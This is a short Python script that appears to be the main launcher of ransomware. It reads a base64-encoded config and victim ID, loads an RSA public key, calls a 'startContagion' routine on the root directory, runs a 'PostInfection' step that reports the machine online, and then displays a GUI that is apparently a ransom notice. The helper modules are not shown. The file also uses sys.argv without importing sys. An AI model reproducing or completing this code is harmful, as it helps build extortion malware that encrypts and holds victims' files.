from base64 import b64decode

import starter
import guiMode
from postInfection import PostInfection
from utils import root_directory, aesIV_file_store_path,when_did_i_work

if starter.checkFirstTime():
    with open("config.txt","r") as configFile:
        version = b64decode(configFile.readline()).strip().decode("utf-8")
        what_is_my_id = b64decode(configFile.readline()).strip().decode("utf-8")

    rsa_public_key = open(str(what_is_my_id)+"_rsa_public_key.pub","r").read()

    starter.keyStoreCreate(version, what_is_my_id)
    starter.startContagion(root_directory, rsa_public_key)
    PostInfection(what_is_my_id , "online", when_did_i_work, rsa_public_key).firstWork()
    guiMode.displayInfoGUI(aesIV_file_store_path)

else:
    guiMode.displayInfoGUI(sys.argv[1])